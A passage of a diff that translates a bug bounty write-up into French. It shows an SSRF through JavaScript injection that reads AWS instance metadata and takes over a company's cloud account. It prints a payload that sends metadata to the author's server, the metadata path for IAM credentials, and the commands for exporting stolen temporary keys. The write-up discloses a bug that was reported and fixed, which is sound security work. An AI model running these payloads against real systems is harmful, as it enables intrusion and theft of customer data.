+</span></span></code></pre></div><p>Mais la réponse (paramètre <code>r</code>) dans mon fichier de log Apache était vide.</p>
+<p>Comme j&rsquo;ai trouvé des buckets S3 liés à ArticMonkey (<code>articmonkey-xxx</code>), j&rsquo;ai supposé que cette entreprise utilisait peut-être
+aussi des serveurs AWS pour son application web (ce qui a été confirmé par l&rsquo;en-tête <code>x-cache: Hit from cloudfront</code> dans certaines réponses).</p>
+<p>Je me suis donc rapidement penché sur la liste des <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection">URL SSRF pour les instances cloud</a>.</p>
+<p>Et j&rsquo;ai obtenu une réponse positive en tentant d&rsquo;accéder aux métadonnées de l&rsquo;instance. <a href="https://glc.st/images/ssrf-aws-takeover-burpsuite.png" title="AWS takeover through ssrf in javascript" target="_blank"><img src="https://glc.st/images/ssrf-aws-takeover-burpsuite.png" alt="AWS takeover through ssrf in javascript" /></a></p>
+<p>Le résultat décodé correspond à la liste des répertoires renvoyée :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ami-id
 </span></span><span style="display:flex;"><span>ami-launch-index
 </span></span><span style="display:flex;"><span>ami-manifest-path
@@ -375,11 +380,11 @@ I quickly jumped on the list of the most common <a href="https://github.com/swis
 </span></span><span style="display:flex;"><span>hostname
 </span></span><span style="display:flex;"><span>iam/
 </span></span><span style="display:flex;"><span>...
-</span></span></code></pre></div><p>Final payload:</p>
+</span></span></code></pre></div><p>Payload final:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{...REDACTED...,&#34;operation&#34;:&#34;Union(&#39;1&#39;;&#39;2;fetch(\&#34;http://169.254.169.254/latest/meta-data/\&#34;).then(res=&gt;res.text()).then((r)=&gt;fetch(\&#34;https://poc.myserver.com/?r=\&#34;+r));&#39;;&#39;3&#39;)&#34;}
-</span></span></code></pre></div><p>Since I didn&rsquo;t know anything about AWS metadatas, because it was my first time in da place.
-I took time to explore the directories and all files at my disposition. As you will read everywhere, the most insteresting one is <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE&gt;</code>.
-Which returned:</p>
+</span></span></code></pre></div><p>N&rsquo;ayant aucune connaissance des métadonnées AWS, puisque c&rsquo;était ma première visite,
+j&rsquo;ai pris le temps d&rsquo;explorer les répertoires et tous les fichiers à ma disposition. Comme vous le lirez partout, le plus intéressant étant <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE&gt;</code>.</p>
+<p>Ce qui a renvoyé :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Code&#34;</span>:<span style="color:#e6db74">&#34;Success&#34;</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Type&#34;</span>:<span style="color:#e6db74">&#34;AWS-HMAC&#34;</span>,
@@ -389,38 +394,43 @@ Which returned:</p>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Expiration&#34;</span>:<span style="color:#e6db74">&#34;2018-09-06T19:24:38Z&#34;</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;LastUpdated&#34;</span>:<span style="color:#e6db74">&#34;2018-09-06T19:09:38Z&#34;</span>
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h2 id="exploit-the-credentials">Exploit the credentials</h2>
-<p>At that time, I though that the game was ended.
-But for my PoC I wanted to show the criticity of this leak, I wanted something really strong!
-I tried to use those credentials to impersonate the company.
-You have to know that they are temporary credentials, only valid for a short period, 5mn more or less.
-Anyway, 5mn is supposed to be more than enough to update my own credentials to those ones, 2 copy/paste, I can handle that&hellip;
-err&hellip;</p>
-<p>I asked for help on Twitter from SSRF and AWS master. Thank guys, I truely appreciate your commitment, but I finally found the solution in the <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html">UserGuide of AWS Identity and Access Management</a>. My mistake, except to not read the documentation (&hellip;), was to only use <code>AccessKeyId</code> and <code>SecretAccessKey</code>, this doesn&rsquo;t work, the token must also be exported. Kiddies&hellip;</p>
+</span></span></code></pre></div><h2 id="exploiter-les-identifiants">Exploiter les identifiants</h2>
+<p>À ce moment-là, je pensais que c&rsquo;était la fin.
+Mais pour mon PoC, je voulais démontrer la gravité de cette fuite, il me fallait quelque chose de vraiment probant !
+J&rsquo;ai essayé d&rsquo;utiliser ces identifiants pour usurper l&rsquo;identité de l&rsquo;entreprise.
+Il faut savoir qu&rsquo;il s&rsquo;agit d&rsquo;identifiants temporaires, valides seulement pendant une courte période, environ 5 minutes.
+Bref, 5 minutes devraient largement suffire pour mettre à jour mes propres identifiants avec ceux-ci : deux copier-coller, je peux gérer ça&hellip;
+Enfin&hellip;</p>
+<p>J&rsquo;ai demandé de l&rsquo;aide sur Twitter aux experts SSRF et AWS.
+Merci à vous deux, j&rsquo;apprécie vraiment votre implication, mais j&rsquo;ai finalement trouvé la solution dans le <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html">Guide utilisateur des Identités AWS Gestion des Accès</a>.
+Mon erreur, outre le fait de ne pas avoir lu la documentation (&hellip;), a été d&rsquo;utiliser uniquement <code>AccessKeyId</code> et <code>SecretAccessKey</code>.
+Cela ne fonctionne pas, le jeton doit également être exporté. Quelle bêtise !</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ export AWS_ACCESS_KEY_ID<span style="color:#f92672">=</span>AKIAX7EFFWBWFRW3ACIR...
 </span></span><span style="display:flex;"><span>$ export AWS_SECRET_ACCESS_KEY<span style="color:#f92672">=</span>wJalrXUtnFEMI...
 </span></span><span style="display:flex;"><span>$ export AWS_SESSION_TOKEN<span style="color:#f92672">=</span>AQoDYXdzEJr...
-</span></span></code></pre></div><p>Checking my idendity with the following command proved that I was not myself anymore.</p>
+</span></span></code></pre></div><p>La vérification de mon identité à l&rsquo;aide de la commande suivante a prouvé que je n&rsquo;étais plus moi-même.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>aws sts get-caller-identity
-</span></span></code></pre></div><p>And then&hellip;<br>
+</span></span></code></pre></div><p>Et soudain&hellip;<br>
 <a href="https://glc.st/images/ssrf-aws-takeover-poc.png" title="aws takeover through ssrf in javascript" target="_blank"><img src="https://glc.st/images/ssrf-aws-takeover-poc.png" alt="aws takeover through ssrf in javascript" /></a></p>
-<p>Left: listing of the EC2 instances configured by ArticMonkey. Probably a big part -or the whole- of their system.</p>
-<p>Right: the company owns 20 buckets containing, highly sensitive datas from customers, static files for the web application and, according to the name of the buckets, probably logs/backups of their servers.</p>
-<p>Impact: lethal.</p>
+<p>À gauche : liste des instances EC2 configurées par ArticMonkey. Il s’agit probablement d’une grande partie, voire de la totalité, de leur système.</p>
+<p>À droite : l’entreprise possède 20 buckets contenant des données hautement sensibles de clients, des fichiers statiques pour l’application web et,
+d’après leur nom, probablement des journaux/sauvegardes de ses serveurs.</p>
+<p>Impact : fatal.</p>
 <h2 id="conclusion">Conclusion</h2>
-<p>I learnt alot because of this bug:</p>
+<p>J&rsquo;ai beaucoup appris grâce à ce bug :</p>
 <ul>
-<li><a href="https://reactjs.org/">ReactJS</a>, <a href="https://developers.google.com/web/updates/2015/03/introduction-to-fetch">fetch()</a>, AWS metadatas.</li>
-<li>RTFM! The official documentation is always a great source of (useful) informations.</li>
-<li>At each step new problems appeared. I had to search everywhere, try many different things, I had to push my limits to not give up.</li>
-<li>I now know that I can fully compromise a system by myself starting from 0, which is a great personal  achievement and statisfaction :)</li>
+<li><a href="https://reactjs.org/">ReactJS</a>, <a href="https://developers.google.com/web/updates/2015/03/introduction-to-fetch">fetch()</a>, métadonnées AWS.</li>
+<li>Lire la documentation ! La documentation officielle est toujours une excellente source d&rsquo;informations (utiles).</li>
+<li>À chaque étape, de nouveaux problèmes sont apparus. J&rsquo;ai dû chercher partout, essayer différentes solutions et repousser mes limites pour ne pas abandonner.</li>
+<li>Je sais maintenant que je peux compromettre entièrement un système par moi-même en partant de zéro, ce qui est une grande fierté et une grande satisfaction personnelle :)</li>
 </ul>
-<p>When someone tells you that you&rsquo;ll never be able to do something, don&rsquo;t waste your time to bargain with these peoples, simply prove them they&rsquo;re wrong by doing it.</p>
-<h2 id="timeline">Timeline</h2>
-<p>06/09/2018 12h00 - beginning of the hunt<br>
-07/09/2018 00h30 - report<br>
-07/09/2018 19h30 - fix and reward</p>
-<p>Thanks to ArticMonkey for being so fast to fix and reward, and agreed this article :)</p>
+<p>Quand quelqu&rsquo;un vous dit que vous ne pourrez jamais faire quelque chose, ne perdez pas votre temps à négocier avec ces personnes,
+prouvez-leur simplement qu&rsquo;elles ont tort en le faisant.</p>
+<h2 id="chronologie">Chronologie</h2>
+<p>06/09/2018 12h00 - Début de la chasse<br>
+07/09/2018 00h30 - Signalement<br>
+07/09/2018 19h30 - Correction et récompense</p>
+<p>Merci à ArticMonkey pour sa réactivité et sa contribution à cet article :)</p>
         </div>
 
         <footer>
